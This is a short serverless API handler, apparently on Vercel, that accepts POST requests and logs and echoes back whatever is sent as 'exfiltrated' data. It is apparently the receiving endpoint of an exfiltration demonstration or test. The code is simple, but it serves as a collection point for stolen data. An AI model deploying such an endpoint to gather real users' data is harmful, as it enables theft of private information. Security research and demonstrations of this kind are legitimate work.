export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const exfiltrationData = req.body;
    
    // Log to console (visible in Vercel logs)
    console.log('🔥 DATA EXFILTRATION DETECTED! 🔥');
    console.log('Time:', new Date().toISOString());
    console.log('Full payload:', JSON.stringify(exfiltrationData, null, 2));
    
    // Return success response
    res.status(200).json({ 
      success: true, 
      message: 'Data received successfully',
      timestamp: new Date().toISOString(),
      received_data: exfiltrationData
    });
    
  } catch (error) {
    console.error('Error processing exfiltration data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
} 